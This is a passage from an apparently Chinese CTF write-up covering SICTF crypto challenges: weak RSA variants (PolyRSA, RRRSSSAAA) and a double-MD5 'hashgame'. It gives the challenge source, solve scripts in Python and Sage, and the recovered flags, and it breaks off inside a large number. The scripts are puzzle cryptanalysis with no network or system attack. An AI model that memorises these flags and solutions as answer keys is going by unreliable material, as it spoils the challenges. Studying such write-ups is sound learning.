class="hljs-number">44457399775772165283580795763046604956432217865936749114390645714446263790235445725770165521476841968764175721036280702731933849090719866149354613431301887740671003826556620460836983488011711209908075106260857650574672356032244606425941095128801765463716482316101398637519304864271794460829068714740938719022156283319142938782439784724450045931039355442034325311037568791297455084676548879770834712506552233840348850684727096270392080049993135041218143811167688449496243036317450681348089315258831745988434134987055263393540923865029931594717328162951158311497514418799360413513590684301435386737514918075848373373755748782672860711406169316940293554209702288482064854840802876490202123903888235028119047988176327629542924415737212649237787748145773301112682790682933658516724691338727523894513267588035437093188599375494920656327919129240066252636130803666175859640361767805549884909317548802917210333235914904622641997249853362378711924024129399688535136879208010081166848163897114124726692078532337827810846421365846926064892472698603597461932481745017020417072013702099809833423003201003030492</span><br>e = <span class="hljs-number">65537</span><br>phi = <span class="hljs-number">156367601475974402995143336378908040952860477592140281716502923468101002113603962472338202519343293683021813608492616735571335781889806580494592433061437445590103680183939182694030477690083123849381638384615403358528373448247586608040831464913727117628732036460516169834885530364477189488436897498824548971447505421979260430779757085905057701828890183301766003676422858872328029117473240600494292339226314733362682083999649134377189961569453868222950898463303662344115641021534838224401932268491972483326181312907141447088889872329127098638446483836443651704520477509821707797504856532033842982959066448341585137132145274813016240735092150523868970094517671115496874544078013828715295441650530874907072326026489798290753786116282315362518192114644603753496977012739114909700085784320423720398538929947664466373783000579482811416733852154360821231242559299052271498254335229659178377535891895087327910350143351556120064417902643002970719306110925104438203052958221625710867669659366694336983490603020446389462306989147274444803125646343536640000000000000000000000000000000000000000000000000000000000</span><br><br>d = gmpy2.invert(e,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m)<br><span class="hljs-comment">#SICTF&#123;13578a78-1bd1-483e-8c01-4d501c8b52bb&#125;</span><br></code></pre></td></tr></table></figure><h4 id="PolyRSA"><a href="#PolyRSA" class="headerlink" title="PolyRSA"></a>PolyRSA</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>k = getRandomNBitInteger(<span class="hljs-number">64</span>)<br>p = k**<span class="hljs-number">5</span> + <span class="hljs-number">9</span>*k**<span class="hljs-number">4</span> - <span class="hljs-number">20</span>*k**<span class="hljs-number">3</span> + <span class="hljs-number">17</span>*k**<span class="hljs-number">5</span> - <span class="hljs-number">144</span>*k + <span class="hljs-number">47527</span><br>q = k**<span class="hljs-number">6</span> - <span class="hljs-number">8</span>*k**<span class="hljs-number">3</span> + <span class="hljs-number">30</span>*k**<span class="hljs-number">3</span> - <span class="hljs-number">149</span>*k**<span class="hljs-number">2</span> - <span class="hljs-number">14</span>*k + <span class="hljs-number">39293</span><br><span class="hljs-keyword">if</span> isPrime(p) <span class="hljs-keyword">and</span> isPrime(q):<br><span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">msg, n, e</span>):<br>m = bytes_to_long(msg)<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(m, e, n)<br><br>n = p * q<br>e = <span class="hljs-number">65537</span><br>c = encrypt(flag, n, e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-comment">#n = 2931835714514227696649197851452018066969814603905505893064829694548691616628661422451386639398824072768907608195113790730392677411502544741840786734616614308622423513064577929715025601090611378413475093510051291</span><br><span class="hljs-comment">#c = 1162375069210804266034094584942794481470301602122091344590668656120128936761168164673823514232328715217241524062023457713973727518007443604233760475552174214966591823835585191443465256735930086309706593996639864</span><br></code></pre></td></tr></table></figure><p>n=p*q，代进去相当于只有k一个未知量，解方程即可<br>sage的solve函数可以求解方程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">n = <span class="hljs-number">2931835714514227696649197851452018066969814603905505893064829694548691616628661422451386639398824072768907608195113790730392677411502544741840786734616614308622423513064577929715025601090611378413475093510051291</span><br>k = var(<span class="hljs-string">&#x27;k&#x27;</span>)<br>p = k**<span class="hljs-number">5</span> + <span class="hljs-number">9</span>*k**<span class="hljs-number">4</span> - <span class="hljs-number">20</span>*k**<span class="hljs-number">3</span> + <span class="hljs-number">17</span>*k**<span class="hljs-number">5</span> - <span class="hljs-number">144</span>*k + <span class="hljs-number">47527</span><br>q = k**<span class="hljs-number">6</span> - <span class="hljs-number">8</span>*k**<span class="hljs-number">3</span> + <span class="hljs-number">30</span>*k**<span class="hljs-number">3</span> - <span class="hljs-number">149</span>*k**<span class="hljs-number">2</span> - <span class="hljs-number">14</span>*k + <span class="hljs-number">39293</span><br>a=n==p*q <br>k = solve(a, k)<br><span class="hljs-built_in">print</span>(k)<br><span class="hljs-comment">#k == 10453474106135055672</span><br></code></pre></td></tr></table></figure><p><img src="/mdimg/sictf/36.png"><br>解出k带进去原来脚本就可以求p，q了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br>n = <span class="hljs-number">2931835714514227696649197851452018066969814603905505893064829694548691616628661422451386639398824072768907608195113790730392677411502544741840786734616614308622423513064577929715025601090611378413475093510051291</span><br>c = <span class="hljs-number">1162375069210804266034094584942794481470301602122091344590668656120128936761168164673823514232328715217241524062023457713973727518007443604233760475552174214966591823835585191443465256735930086309706593996639864</span><br>e = <span class="hljs-number">65537</span><br>k = <span class="hljs-number">10453474106135055672</span><br>p = k**<span class="hljs-number">5</span> + <span class="hljs-number">9</span>*k**<span class="hljs-number">4</span> - <span class="hljs-number">20</span>*k**<span class="hljs-number">3</span> + <span class="hljs-number">17</span>*k**<span class="hljs-number">5</span> - <span class="hljs-number">144</span>*k + <span class="hljs-number">47527</span><br>q = k**<span class="hljs-number">6</span> - <span class="hljs-number">8</span>*k**<span class="hljs-number">3</span> + <span class="hljs-number">30</span>*k**<span class="hljs-number">3</span> - <span class="hljs-number">149</span>*k**<span class="hljs-number">2</span> - <span class="hljs-number">14</span>*k + <span class="hljs-number">39293</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = gmpy2.invert(e,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><br></code></pre></td></tr></table></figure><h4 id="hashgame"><a href="#hashgame" class="headerlink" title="hashgame"></a>hashgame</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-built_in">print</span>(md5(<span class="hljs-built_in">str</span>(md5(i.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).hexdigest()).encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).hexdigest())<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">999a215b1f8372bb0f1c84c467a1506b</span><br><span class="hljs-string">02b0b94ee1fa195ae7959560893f7e3c</span><br><span class="hljs-string">297e7ca127d2eef674c119331fe30dff</span><br><span class="hljs-string">65c162f7c43612ba1bdf4d0f2912bbc0</span><br><span class="hljs-string">ed8a4ab0c0967b14e3bf6b145e153ec9</span><br><span class="hljs-string">d24412e1ab190533176a653cef11b185</span><br><span class="hljs-string">815e6212def15fe76ed27cec7a393d59</span><br><span class="hljs-string">38026ed22fc1a91d92b5d2ef93540f20</span><br><span class="hljs-string">cd7fd1517e323f26c6f1b0b6b96e3b3d</span><br><span class="hljs-string">a94837b18f8f43f29448b40a6e7386ba</span><br><span class="hljs-string">dc0ae7e1387be9b795f5d6299e383759</span><br><span class="hljs-string">815e6212def15fe76ed27cec7a393d59</span><br><span class="hljs-string">38026ed22fc1a91d92b5d2ef93540f20</span><br><span class="hljs-string">dc0ae7e1387be9b795f5d6299e383759</span><br><span class="hljs-string">a3655d5c04849a174d341b13d5cf5468</span><br><span class="hljs-string">28c8edde3d61a0411511d3b1866f0636</span><br><span class="hljs-string">011ecee7d295c066ae68d4396215c3d0</span><br><span class="hljs-string">d7afde3e7059cd0a0fe09eec4b0008cd</span><br><span class="hljs-string">39abe4bca904bca5a11121955a2996bf</span><br><span class="hljs-string">a3655d5c04849a174d341b13d5cf5468</span><br><span class="hljs-string">011ecee7d295c066ae68d4396215c3d0</span><br><span class="hljs-string">28c8edde3d61a0411511d3b1866f0636</span><br><span class="hljs-string">38026ed22fc1a91d92b5d2ef93540f20</span><br><span class="hljs-string">dc0ae7e1387be9b795f5d6299e383759</span><br><span class="hljs-string">a3655d5c04849a174d341b13d5cf5468</span><br><span class="hljs-string">4c0d13d3ad6cc317017872e51d01b238</span><br><span class="hljs-string">83be264eb452fcf0a1c322f2c7cbf987</span><br><span class="hljs-string">4e44f1ac85cd60e3caa56bfd4afb675e</span><br><span class="hljs-string">815e6212def15fe76ed27cec7a393d59</span><br><span class="hljs-string">a3655d5c04849a174d341b13d5cf5468</span><br><span class="hljs-string">28c8edde3d61a0411511d3b1866f0636</span><br><span class="hljs-string">4e44f1ac85cd60e3caa56bfd4afb675e</span><br><span class="hljs-string">ed108f6919ebadc8e809f8b86ef40b05</span><br><span class="hljs-string">a94837b18f8f43f29448b40a6e7386ba</span><br><span class="hljs-string">dcfcd07e645d245babe887e5e2daa016</span><br><span class="hljs-string">665f644e43731ff9db3d341da5c827e1</span><br><span class="hljs-string">83be264eb452fcf0a1c322f2c7cbf987</span><br><span class="hljs-string">39abe4bca904bca5a11121955a2996bf</span><br><span class="hljs-string">39abe4bca904bca5a11121955a2996bf</span><br><span class="hljs-string">4c0d13d3ad6cc317017872e51d01b238</span><br><span class="hljs-string">dc0ae7e1387be9b795f5d6299e383759</span><br><span class="hljs-string">011ecee7d295c066ae68d4396215c3d0</span><br><span class="hljs-string">5eccf232f5ebb3e780543372692fff18</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>对flag先MD5加密为32位一个字符串，然后再对这个字符串的每一个字符MD5，改一下脚本爆破一下就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br>a=<span class="hljs-string">&#x27;&#x27;</span><br>enc=[<span class="hljs-string">&#x27;999a215b1f8372bb0f1c84c467a1506b&#x27;</span>, <span class="hljs-string">&#x27;02b0b94ee1fa195ae7959560893f7e3c&#x27;</span>, <span class="hljs-string">&#x27;297e7ca127d2eef674c119331fe30dff&#x27;</span>, <span class="hljs-string">&#x27;65c162f7c43612ba1bdf4d0f2912bbc0&#x27;</span>, <span class="hljs-string">&#x27;ed8a4ab0c0967b14e3bf6b145e153ec9&#x27;</span>, <span class="hljs-string">&#x27;d24412e1ab190533176a653cef11b185&#x27;</span>, <span class="hljs-string">&#x27;815e6212def15fe76ed27cec7a393d59&#x27;</span>, <span class="hljs-string">&#x27;38026ed22fc1a91d92b5d2ef93540f20&#x27;</span>, <span class="hljs-string">&#x27;cd7fd1517e323f26c6f1b0b6b96e3b3d&#x27;</span>, <span class="hljs-string">&#x27;a94837b18f8f43f29448b40a6e7386ba&#x27;</span>, <span class="hljs-string">&#x27;dc0ae7e1387be9b795f5d6299e383759&#x27;</span>, <span class="hljs-string">&#x27;815e6212def15fe76ed27cec7a393d59&#x27;</span>, <span class="hljs-string">&#x27;38026ed22fc1a91d92b5d2ef93540f20&#x27;</span>, <span class="hljs-string">&#x27;dc0ae7e1387be9b795f5d6299e383759&#x27;</span>, <span class="hljs-string">&#x27;a3655d5c04849a174d341b13d5cf5468&#x27;</span>, <span class="hljs-string">&#x27;28c8edde3d61a0411511d3b1866f0636&#x27;</span>, <span class="hljs-string">&#x27;011ecee7d295c066ae68d4396215c3d0&#x27;</span>, <span class="hljs-string">&#x27;d7afde3e7059cd0a0fe09eec4b0008cd&#x27;</span>, <span class="hljs-string">&#x27;39abe4bca904bca5a11121955a2996bf&#x27;</span>, <span class="hljs-string">&#x27;a3655d5c04849a174d341b13d5cf5468&#x27;</span>, <span class="hljs-string">&#x27;011ecee7d295c066ae68d4396215c3d0&#x27;</span>, <span class="hljs-string">&#x27;28c8edde3d61a0411511d3b1866f0636&#x27;</span>, <span class="hljs-string">&#x27;38026ed22fc1a91d92b5d2ef93540f20&#x27;</span>, <span class="hljs-string">&#x27;dc0ae7e1387be9b795f5d6299e383759&#x27;</span>, <span class="hljs-string">&#x27;a3655d5c04849a174d341b13d5cf5468&#x27;</span>, <span class="hljs-string">&#x27;4c0d13d3ad6cc317017872e51d01b238&#x27;</span>, <span class="hljs-string">&#x27;83be264eb452fcf0a1c322f2c7cbf987&#x27;</span>, <span class="hljs-string">&#x27;4e44f1ac85cd60e3caa56bfd4afb675e&#x27;</span>, <span class="hljs-string">&#x27;815e6212def15fe76ed27cec7a393d59&#x27;</span>, <span class="hljs-string">&#x27;a3655d5c04849a174d341b13d5cf5468&#x27;</span>, <span class="hljs-string">&#x27;28c8edde3d61a0411511d3b1866f0636&#x27;</span>, <span class="hljs-string">&#x27;4e44f1ac85cd60e3caa56bfd4afb675e&#x27;</span>, <span class="hljs-string">&#x27;ed108f6919ebadc8e809f8b86ef40b05&#x27;</span>, <span class="hljs-string">&#x27;a94837b18f8f43f29448b40a6e7386ba&#x27;</span>, <span class="hljs-string">&#x27;dcfcd07e645d245babe887e5e2daa016&#x27;</span>, <span class="hljs-string">&#x27;665f644e43731ff9db3d341da5c827e1&#x27;</span>, <span class="hljs-string">&#x27;83be264eb452fcf0a1c322f2c7cbf987&#x27;</span>, <span class="hljs-string">&#x27;39abe4bca904bca5a11121955a2996bf&#x27;</span>, <span class="hljs-string">&#x27;39abe4bca904bca5a11121955a2996bf&#x27;</span>, <span class="hljs-string">&#x27;4c0d13d3ad6cc317017872e51d01b238&#x27;</span>, <span class="hljs-string">&#x27;dc0ae7e1387be9b795f5d6299e383759&#x27;</span>, <span class="hljs-string">&#x27;011ecee7d295c066ae68d4396215c3d0&#x27;</span>, <span class="hljs-string">&#x27;5eccf232f5ebb3e780543372692fff18&#x27;</span>]<br><br>dic = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_&#125;&#123;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">43</span>):<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> dic:<br>      des=md5(<span class="hljs-built_in">str</span>(md5(k.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).hexdigest()).encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).hexdigest()<br>      <span class="hljs-keyword">if</span> des==enc[i]:<br>         a=a+k<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-comment">#SICTF&#123;837eb83b-14ad-413b-9f58-15ce02fdd9b4&#125;</span><br></code></pre></td></tr></table></figure><h4 id="RRRSSSAAA"><a href="#RRRSSSAAA" class="headerlink" title="RRRSSSAAA"></a>RRRSSSAAA</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">from</span> Crypto.Util.number import *<br>import gmpy2<br>import libnum<br><span class="hljs-keyword">from</span> secret import flag,hint,alpha<br><br>def <span class="hljs-title function_ invoke__">gen_num</span>(x):<br>    <span class="hljs-keyword">while</span> True:<br>        x+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">isPrime</span>(x):<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> x<br><br>p = <span class="hljs-title function_ invoke__">getPrime</span>(<span class="hljs-number">512</span>)<br>q = <span class="hljs-title function_ invoke__">gen_num</span>(p*alpha)<br>r = <span class="hljs-title function_ invoke__">gen_num</span>(q*alpha*<span class="hljs-number">2</span>)<br>s = <span class="hljs-title function_ invoke__">gen_num</span>(r*alpha*<span class="hljs-number">4</span>)<br>n = p**alpha * q**(alpha*<span class="hljs-number">2</span>) * r**(alpha*<span class="hljs-number">4</span>) * s**<span class="hljs-number">2</span><br>e = <span class="hljs-title function_ invoke__">getPrime</span>(<span class="hljs-number">2048</span>)<br>c = <span class="hljs-title function_ invoke__">pow</span>(libnum.<span class="hljs-title function_ invoke__">s2n</span>(flag), e, n)<br><br><span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;n =&#x27;</span>, n)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;c =&#x27;</span>, c)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;e =&#x27;</span>, e)<br>n = <span class="hljs-number">510598540378970007468346322989879190780475356832709189528874695730531468123747091318830966440138615736420891392158097533731041150162690662471483619765171875053776526546923686545162088172326434280369545887080098691661618888498451216122577703462656147845476260802989936275927468143618457014875124540773380472942489037761179303561650189545290190421786318533073909424735517884608967725919128200358535113829753453601297612782921831305721998858231417374167746154206561475003022801732102170674160043866579234096945753255309604584663823273990392197858273029361669185072049422597132579136784027822968387907216366150999438414498332890674564920800382005582891491049365978733797356415518435343495821039314228388769356638637099572998812062355774848959446125701462950655806332002764535951282449862140062574418031213788534096501985200284615865248974807525604893147298611402252296159828500266098282909607218395957805357667923653409828275804406466185333491486073920384298557332939701611488655278812282652143513835104674009767479927241052662403578967182673338296967573503287747778401579267126898937724971226916836862238412923209155792382534204896050548824028658237640251964366961727999178646613907934616655737902329568420682808750546571786374023614255135110482419627491157502417864563832543812083026753673687664854910877686333766643694031564516722983669199704788291656757271915091399977189663329054202997146978631991467923388119989473941572476162990901960011968892272676827771256008656450296183884491251752111424531449198118292179798490440493223653950102915889401116251591885909790869073018774674246846164536910633015902964911907187085243240032540938841961345835517368130042501382327926289017383981908729734129193302049155793436988510517701765733605569135643208447952662352778482137713239592896997102366230279153456455232519301534222340901671138239539845240151878610363390683459663471954623868659324304077587611084188341121303918876492043578883059738615210439439368338460631574255417822627815523601923537626576677004085017875860928802762176477815284840936951142176532768517728636562256240668409525184886142801802825451465440993457022771077957094228957592122319682216294509338262739872163482972508991702525289361105971574659126127296233247905505496525683817711366704746617027744889413904684867577081667137187623825349410229389484199608739864221035985277681307389939848405790294473878622092200837753161101695539947514614727699952200114544362051873938505591469240465379091377837297561323297393518152524513948294475770774872596601345526469590486037386767964812631618224527233850818909346007449756779707319609915127618828551910681421647307180399632857248867655836894968134457622987954781685664833951774981383914013420724637676787907498490619865488706542422141338754933476190313653530739822029700217857534243473680585150263523947891501341441371965435851479670882202992955935279933652356336270251591324623898094984119190752775236005057405257945038031382867511822173122001309505728526596893926445291712035117553637589190292816001770554129840326832888707541999454791653742647879694585329112697382151447923691770809327807665376014114552626285289291808032845544905356380497227622738746307685611140483875177839511922977657045680353723672792411661489242162646272105649970359134277499907207906149573299990033858943215801954126448693460102775418225293255402758159431943811872373682053160944887775375465971432320964554947377318554518275854303099420999992690990916801757184853847474379621177976926681977371922191722085164910430032177320954341986984523594583172470609743970245810969858512632597943721628165724329447516823159387734220282510185959768239630017162115072758419177056571781075148374822721899683720488356041096248563880547752710289151512607087038310649235610688255059182467964379544134070766646863815775576049106337955345150055151813028534690066771104188418296440067303355417210829440978858599306487361626723932883675404705319649877631289465547597225908934420304867048341698308940436377375588905463549199568800788130324653074398891097223958392703515180958466771395566567923630440881986781120062769327993137151783189811570714391264155060840731029466593405853721833971303821804104382800673631786729744779165371433211267361024896576031556979771007693215198547296582235167582106419779580693225211695215406540025468141235241168387527901851774993867055740692835931115312659500713701652905802357951993290979099170159167009106534001226859533836082801229997337966972579186548771169099646656172882424089451273021293821026173210665095782802709874946641962115525841325300318524665386511421662860490620819561338110623774842340380068922415609137358448899126553279894950604871889208579886778999174405582160576479554324208876082033912031737086248121899303730781498156597249803927142235444644481388064486155431912003641095674949903404176810866307571531389637794147871012904134653569388493652441432759092336752228939764110397029831387803943394811558386122839568158928461007578259968765727092577006588264867960486472014493774664081407186721351852883527145790575242285664659303948842228766554243966691396492391152581830022133814454196259968655735361775914705332258892954614272244452518449260489348504449204461418971768011384340273291232094176572232837038670467853897665877851434992557429017504229337778470080893449423405491607587635438331476572996201482633587271479001915768182336813417460145272910780420062773057289352127058606048428315185624554551172152106354445240590380140756355226376829443068190672329776832112173322011137862590548721676059398379694994522794474774534579546109677615257696703950497332824299576069196330271666459758430542051969093680846765661685489556479825015505460585577388300005030240514448617715276600874290664416888184557142542207029827016362686924883704397874129412267949416733492080843315519912943048041880665442664534980370689081266908497051077237188221752059058912835617635691061804481035908317765279937217591432632832678806430381325340000898958680468694182993189208039459712391492410123386884340504648296815916980264240229859574883155040793388439699245314010536014311134726579595932201351264754211113984594974123575279085420654342347792446273359397655783349850267895960713020361459104930811498666622216299579774939159380045958811891996366190154624989040001455252320159516822116133341010157165599727635333348456688307169980804760876207246783116588952529877373514768545007418968307885769960168050996962066803264260375707466369627458024513973771207018864983698407016663019106354023164759250846073414341438963394719456500998324900154652118420207057668806120330181700845296117532235012372135050553397046174401449323031309344766628888675704109715329046692002106076405553528413866402862565543443907259825033515101841485790388106868972724754988229771779715569516295419556055234476868558577442887306482605945053829666543946452255290321024138948999088611233226734197091325915223296133751626031378197131875533631358612215053149934608672729194446883476706267066475008836864936670808320239466055935088929279252129128009704233352664523535820092988950793050907265677092793104426094212209504897403359406325045852228354350509453013015487815230129380079713113632363881496974185547766115624580099624722897692297760495094913178120692467666707678647081180656345151015995338390986674404981831649353833607305738823436744297628382797810952028446046016233612873716789383675779820186248250486000672269630344269347652027789034023080859790238772676504723029078903218723114249502157501775936110552413022658586833869562215506206204712447588632398550497708640229614956652263449460598992811393334042395804931240940416629178335447861485028284981615219874331354750385150254017244750993573994159458909546341067039268159319391512934162794663414200907868505060542602841564239761181077333990423542820064315891665379550720216448942932714180923613869070005330476506812100063599659432570925437054287120906048730323556681557905787470647037629769660028387819741611799183349496549168370221978146678987457271259655273299546276899538032070218474555442304430064164467753804089753466882786069297036926063093020795423414152340563079346797084488827259011515774643776620378827875819192074121522712821147817374988804339999134520633699074448564057555026364304855373068414955699295158212425760345481057281658337956841137897162198027254556350868502178340964817530029135654659162400076087528650997151875596189190736466304722028587441680622878918057024286243448077104494316372739218635221411755498456912672491099154558604384574583302548226057069534004474532514444674565766058970748694657151540644416463532338966570743112669782840065402131461088637463019996192189423665651801811614499041923273110971446683450048861113332787126098622974613883291506736280588039145040361795192519576202306796277888696719887642051327259799873478040156450250036778305950744573270786882726162630115640020293415918210448873867037875790399234972055537649774407094382744621251926131880807765203843946682834221238903263352845265134368550124026502981782369374484091775137498831749984649699756860976525160646445060537001</span><br>c = <span class="hljs-number">2531158826968617795544873459382924122557717998816471394185297761103165748335435821170312723425685754304593149059523546269415450028650433532186356690459152658716429727754058801940418375009330303011015596430823315562597921339142657700112773216179353217193003237231148578980083913537858412584394500321778663550078078453618131369772835451092134304931989160942358095112708247915404212408853664235381251636247376324342533649868102473113101371215832092655082602327789828382399225857288407727650695390198437041349338942170124451717727569429058059588332470520442654660036009106297229315947988026824070192958413771405369270417379270374431961932069206109206161520275394313505820463761099423216881808146286391590926110021195867454364700541623522262060621284175358641983644868144565468138995121112460328796239716467234302639110139539344210308625672626603127571066630984045144311082417597696435510923920160972112096181019887945632185522235223506525708287260043860468761726771872558899346408414769503761014563423778852669138635859686736852316406111419524586006203324427627048026773761720661277548633577985130942663878925016690093178475160050819045078580634083929746843262635482326801110839969924987635836386629346989957215883775774862958649233978388845660025913638761677759389478930243175239144733327800081152106209646739750122765156649897077908081118880599237097094240320843249439338789419717672024431563955989561679955135760168859754158570903936619008811737888041492853293708549071333614052392698390018837802159322555013199352827516627221502851043569094458259655754906871531251591905933391694174493730825567195976485916248779265827481232289167916191548009886470910634735729201594988224309556499928363028987684291355841520596773445265794499135026810820222595295206645909316879282568462640527161761336207089714210305413980656649518317233579495730882264811653783056739697123832993914282956316935519409352921107116007868383349191994002287186205998134696100386762054262057891768468786968255026912722629101160706454573938685005484616730774402270883183325251777860779625859829090813927434522134365158361824928730873827901168296078746018918344509563816411673470062449671148722717674082839769629562023279635600513605851782831113983938142406630208611193063599814306303344613185985279795876519917380771554104595610828559695878074283480553322353836635432708773608850059909435810716468942357296479338578819421891891959647886209729247762842636033387431426010813333937594266650860631139180525296627796175810882194615442847761610000432145760487922052374242763332387295369993152198033202624153104947403143814279239462857601612132203629474017698018994085303667937584557701797878307101597082913667622138958584805818954479376057019679762943228267237100029084049211972043335019283364883979473059818862037441686523242665853884190089710816217358073932367532488077849492403898235834953184819709099054102070829511615662438913527365049181160101163690392858601150452643149865201154869315798502945639885118982102077895852780917443315624354403062434191571381066128703765958601876808547067024079094217150684363727144272182360826649036462742933102369819995521845637171626900497976498238392129484286412119612469940203720459850431096939078909200111431982285224250094114135528169372511046050654842626310521349840419751960661583167285393164658375774214549256210125054659399787458607692664124104731751083802404214750877059517571814617571683386778158124529865839217550206948397973633633073112494203675707170908663807528465558978786856502376373466421935394014382018331853464036050628777920846842726837718397350152833374981600385583486356539412244819102957852851165019463262398920863740100811442245168631231964405451494470056643091283534051860169876712819583370418265773056658924789127762710102710663573299813673539807885889938471311859366898477359290470413140290514575457009196690112041120140525643523206329579083316113200224627966316138842199724222690712682985892217470965362769614635547269026219812733897111261075383966167708046377511241188419623018587723406672856471692955160712914173515537952904830020470028551166620520468624475155714768433859130011140607597675998829593787004574303181606799476891530311112525366486536986358680723494535244504502650149584967144769150225348964265765284894910282340776210894316178924413411986644104067084003701561730705682115028545399419902494745777464725361851299567731379203610610049793665414200817338926034541185452038336680083154233924375742103312110316794352091588504369888260969300762959109322581972765324018300345033980285705973687064519760917079983861031630712314692796666991263822758751739628291094635519478127541534349117058339248015359908612537405184430686951007915246176312262266828024919204702478462469277624426587415347311499361901911347416695812684136854575869383278675694629883389103317175253407938736464102183531186150960949412559328594744493999